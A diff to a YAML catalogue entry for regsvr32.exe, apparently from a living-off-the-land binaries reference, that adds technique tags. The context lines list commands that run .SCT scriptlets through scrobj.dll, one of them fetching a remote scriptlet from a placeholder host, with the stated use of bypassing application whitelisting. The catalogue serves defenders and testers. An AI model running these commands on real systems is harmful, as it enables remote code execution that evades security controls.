@@ -11,6 +11,9 @@ Commands:
     Privileges: User
     MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: SCT
+      - Execute: Remote
   - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: Execute the specified local .SCT script with scrobj.dll.
     Usecase: Execute code from scriptlet, bypass Application whitelisting
@@ -18,6 +21,8 @@ Commands:
     Privileges: User
     MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: SCT
   - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
     Description: Execute the specified remote .SCT script with scrobj.dll.
     Usecase: Execute code from remote scriptlet, bypass Application whitelisting
@@ -25,6 +30,9 @@ Commands:
     Privileges: User
     MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: SCT
+      - Execute: Remote
   - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: Execute the specified local .SCT script with scrobj.dll.
     Usecase: Execute code from scriptlet, bypass Application whitelisting
@@ -32,6 +40,8 @@ Commands:
     Privileges: User
     MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: SCT
 Full_Path:
   - Path: C:\Windows\System32\regsvr32.exe
   - Path: C:\Windows\SysWOW64\regsvr32.exe
